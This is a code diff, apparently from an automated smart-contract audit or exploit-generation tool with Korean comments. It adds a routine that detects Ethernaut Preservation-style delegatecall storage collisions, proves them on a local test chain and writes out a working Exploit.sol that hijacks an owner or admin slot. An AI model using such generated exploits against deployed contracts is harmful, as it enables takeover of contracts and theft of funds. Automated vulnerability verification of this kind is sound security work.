@@ -1900,6 +1900,116 @@ def _proxy_attempt(name, target_src, invariants_src, manifest, scan_step, t0):
     return None
 
 
+def _slot_index(tb, var):
+    """컨트랙트 본문에서 상태변수 `var` 의 스토리지 슬롯 인덱스(단순 1슬롯/변수 가정,
+    constant/immutable 제외). Preservation 류 스토리지 충돌 계산용."""
+    idx = 0
+    for line in tb.split(";"):
+        line = line.strip()
+        md = re.match(r"(mapping\s*\([^)]*\)[^ ]*|address|uint\d*|int\d*|bool|bytes\d*|string|bytes)\s+"
+                      r"(?:public\s+|private\s+|internal\s+)?(constant\s+|immutable\s+)?(\w+)", line)
+        if not md:
+            continue
+        if md.group(2):   # constant/immutable → 슬롯 없음
+            continue
+        if md.group(3) == var:
+            return idx
+        idx += 1
+    return None
+
+
+def _synth_storage_collision(name, target_src, invariants_src, manifest, scan_step, t0):
+    """Ethernaut Preservation 류: 타깃이 상태 라이브러리 주소(slot0)를 통해
+    delegatecall(encodeWithSignature("g(uint256)")) 하고, 라이브러리 g 가 자기 slot0
+    을 쓰는 구조. 1) 라이브러리 포인터(slot0)를 악성 Pwn 으로 덮어쓰고 2) 다시 호출해
+    Pwn.g 로 owner/admin 슬롯을 탈취하는 2단계 스토리지 충돌 공격을 합성한다."""
+    import solcx
+    from web3 import Web3
+    src = _strip_comments(target_src)
+    bodies = _contract_bodies(src)
+    if name not in bodies:
+        return None
+    tb = bodies[name]
+    # delegatecall 대상이 상태변수(slot0)이고 encodeWithSignature 로 g(uint256) 호출하는 함수 f(uint)
+    f = None; libvar = None; gname = None
+    for fn in _functions(tb):
+        m = re.search(r"(\w+)\s*\.\s*delegatecall\s*\(\s*abi\.encodeWithSignature\s*\(\s*\"(\w+)\(", fn["body"])
+        if m and any(a[0].startswith("uint") for a in fn["args"]):
+            f, libvar, gname = fn["name"], m.group(1), m.group(2)
+            break
+    if not f:
+        return None
+    if _slot_index(tb, libvar) != 0:   # 라이브러리 포인터가 slot0 이어야 충돌 성립
+        return None
+    priv = "owner" if _slot_index(tb, "owner") is not None else ("admin" if _slot_index(tb, "admin") is not None else None)
+    if not priv:
+        return None
+    k = _slot_index(tb, priv)
+    _solcv, _evm = _solc_for(target_src)
+    words = "".join(f"    uint256 s{i};\n" for i in range(k + 1))
+    pwn_src = (HEADER + "contract Pwn {\n" + words +
+               f"    function {gname}(uint256) public {{ s{k} = uint256(uint160(msg.sender)); }}\n}}\n")
+    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src},"Pwn.sol":{"content":pwn_src}},
+           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
+    try:
+        compiled = solcx.compile_standard(std, allow_empty=True)
+    except Exception:
+        return None
+    arts = {}
+    for _fl, cs in compiled.get("contracts", {}).items():
+        for cn, c in cs.items():
+            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
+    # 라이브러리: gname(uint256) 을 가진 형제 컨트랙트
+    lib = None
+    for cn, b in bodies.items():
+        if cn != name and re.search(r"function\s+" + re.escape(gname) + r"\s*\(\s*uint", b):
+            lib = cn; break
+    if lib is None or lib not in arts or "Pwn" not in arts:
+        return None
+    w3, acct = _mk_evm()
+    accts = list(w3.eth.accounts); deployer = accts[1] if len(accts) > 1 else acct
+    def dep(cn, args, frm):
+        C = w3.eth.contract(abi=arts[cn]["abi"], bytecode=arts[cn]["bin"])
+        return w3.eth.wait_for_transaction_receipt(
+            C.constructor(*args).transact({"from":frm,"gas":12_000_000})).contractAddress
+    try:
+        laddr = dep(lib, [_default_for_type(t) for t in _abi_ctor_types(arts[lib]["abi"])], deployer)
+        ctypes = _abi_ctor_types(arts[name]["abi"])
+        cargs = [Web3.to_checksum_address(laddr) if t == "address" else _default_for_type(t) for t in ctypes]
+        taddr = dep(name, cargs, deployer)
+        paddr = dep("Pwn", [], acct)
+    except Exception:
+        return None
+    tc = w3.eth.contract(address=taddr, abi=arts[name]["abi"])
+    getter = priv
+    o0 = tc.functions[getter]().call()
+    try:
+        tc.functions[f](int(paddr, 16)).transact({"from":acct,"gas":3_000_000})   # slot0(lib) := Pwn
+        tc.functions[f](0).transact({"from":acct,"gas":3_000_000})                 # delegatecall Pwn -> owner
+    except Exception:
+        return None
+    if tc.functions[getter]().call() == o0:
+        return None
+    poc = (HEADER +
+        "// Strategy: delegatecall storage-collision (2-step). The target delegatecalls\n"
+        f"// a library at slot0; step 1 overwrites that pointer with Pwn via {f}(uint(Pwn)),\n"
+        f"// step 2 runs Pwn.{gname} which writes slot {k} ({priv}).\n"
+        "contract Pwn {\n" + words +
+        f"    function {gname}(uint256) public {{ s{k} = uint256(uint160(msg.sender)); }}\n}}\n\n"
+        f"interface IT {{ function {f}(uint256) external; }}\n"
+        "contract Exploit {\n"
+        "    function run(address t) external payable {\n"
+        "        Pwn p = new Pwn();\n"
+        f"        IT(t).{f}(uint256(uint160(address(p))));\n"
+        f"        IT(t).{f}(0);\n"
+        "    }\n    receive() external payable {}\n}\n")
+    gen = {"step":"generate","title":"Exploit.sol 생성 (storage-collision)","strategy":"storage-collision","exploit_src":poc}
+    return {"name":name,"proven":True,"firstViolated":f"{priv} hijacked (storage collision)",
+            "strategy":f"storage-collision:{f}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
+            "note":"delegatecall 스토리지 충돌로 라이브러리 포인터를 덮어쓰고 특권 슬롯을 탈취했습니다.",
+            "ms":int((time.time()-t0)*1000)}
+
+
 def _multiblock_attempt(name, target_src, invariants_src, manifest, scan_step, t0):
     """다중 블록 러너: 블록 엔트로피로 결과가 정해지는 게임(예: CoinFlip)에서,
     소스의 결과식을 복제한 공격 컨트랙트를 배포하고 블록을 넘기며 매 블록 올바른
@@ -2241,6 +2351,13 @@ def _fuzz_fallback(name, target_src, invariants_src, manifest, do_verify, scan_s
     # 0f) 다중 블록 러너 (예: CoinFlip / Predict the Future)
     try:
         r = _multiblock_attempt(name, target_src, invariants_src, manifest, scan_step, t0)
+        if r:
+            return r
+    except Exception:
+        pass
+    # 0g) delegatecall 스토리지 충돌 2단계 (예: Preservation)
+    try:
+        r = _synth_storage_collision(name, target_src, invariants_src, manifest, scan_step, t0)
         if r:
             return r
     except Exception:
